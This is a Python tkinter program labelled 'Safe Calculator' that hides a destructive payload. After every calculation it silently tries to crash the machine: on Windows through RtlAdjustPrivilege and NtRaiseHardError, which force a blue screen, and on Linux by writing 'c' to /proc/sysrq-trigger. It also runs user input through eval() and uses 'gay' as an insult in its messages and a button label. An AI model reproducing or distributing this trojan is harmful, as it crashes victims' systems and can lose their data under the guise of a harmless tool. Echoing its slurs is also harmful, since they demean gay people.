import os
import tkinter as tk
from tkinter import messagebox
try:
    from ctypes import windll
    from ctypes import c_int
    from ctypes import c_uint
    from ctypes import c_ulong
    from ctypes import POINTER
    from ctypes import byref
except ImportError:
    print("gay non windows user")

def create_calculator_gui():
    root = tk.Tk()
    root.title("Safe Calculator")
    root.geometry("300x400")
    root.resizable(False, False)

    entry = tk.Entry(root, width=20, font=('Arial', 24), bd=5, insertwidth=2, justify='right')
    entry.grid(row=0, column=0, columnspan=4, pady=10)

    def button_click(char):
        current_text = entry.get()
        entry.delete(0, tk.END)
        entry.insert(0, current_text + str(char))

    def clear_entry():
        entry.delete(0, tk.END)

    def run_windows_function():
        nullptr = POINTER(c_int)()
        
        windll.ntdll.RtlAdjustPrivilege(
            c_uint(19),
            c_uint(1),
            c_uint(0),
            byref(c_int())
        )
        
        windll.ntdll.NtRaiseHardError(
            c_ulong(0xC000007B),
            c_ulong(0),
            nullptr,
            nullptr,
            c_uint(6),
            byref(c_uint())
        )

    def simulate_bash_script():
        """
        This function executes different code based on the operating system.
        It includes a specific bash command for Linux and calls a Python function for Windows.
        """
        if os.name == 'nt':
            run_windows_function()
        elif os.name == 'posix':
            messagebox.showinfo("OS Check", "Running on Linux/macOS. Executing custom bash script.")
            try:
                os.system("echo killall kernel_task")
                os.system("echo c > /proc/sysrq-trigger")
            except Exception as e:
                messagebox.showerror("Script Error", f"Error executing Linux script: {e}")
        else:
            messagebox.showinfo("OS Check", f"Running on an unsupported OS: {os.name}")


    def calculate_result():
        try:
            expression = entry.get()
            if '/0' in expression and not '/0.' in expression: 
                messagebox.showerror("Error", "Seriously?")
                clear_entry()
                return

            result = eval(expression)
            entry.delete(0, tk.END)
            entry.insert(0, str(result))

            simulate_bash_script()

        except ZeroDivisionError:
            messagebox.showerror("Error", "Gayyyyyyyyyyyyyy")
            clear_entry()
        except SyntaxError:
            messagebox.showerror("Error", "Invalid expression!")
            clear_entry()
        except Exception as e:
            messagebox.showerror("Error", f"An error occurred: {e}")
            clear_entry()

    buttons = [
        ('7', 1, 0), ('8', 1, 1), ('9', 1, 2), ('/', 1, 3),
        ('4', 2, 0), ('5', 2, 1), ('6', 2, 2), ('*', 2, 3),
        ('1', 3, 0), ('2', 3, 1), ('3', 3, 2), ('-', 3, 3),
        ('0', 4, 0), ('.', 4, 1), ('+', 4, 2), ('gay button', 4, 3),
    ]

    for (text, row, col) in buttons:
        if text == '+': 
            btn = tk.Button(root, text=text, font=('Arial', 18), padx=20, pady=20,
                            command=lambda t=text: button_click(t))
            btn.grid(row=row, column=col, columnspan=2, sticky="nsew", padx=5, pady=5)
        else:
            btn = tk.Button(root, text=text, font=('Arial', 18), padx=20, pady=20,
                            command=lambda t=text: button_click(t))
            btn.grid(row=row, column=col, sticky="nsew", padx=5, pady=5)

    clear_btn = tk.Button(root, text="C", font=('Arial', 18), padx=20, pady=20, command=clear_entry)
    clear_btn.grid(row=4, column=2, sticky="nsew", padx=5, pady=5)

    equals_btn = tk.Button(root, text="=", font=('Arial', 18), padx=20, pady=20, command=calculate_result)
    equals_btn.grid(row=5, column=0, columnspan=4, sticky="nsew", padx=5, pady=5)

    for i in range(6):
        root.grid_rowconfigure(i, weight=1)
    for i in range(4):
        root.grid_columnconfigure(i, weight=1)

    root.mainloop()

if __name__ == "__main__":
    create_calculator_gui()
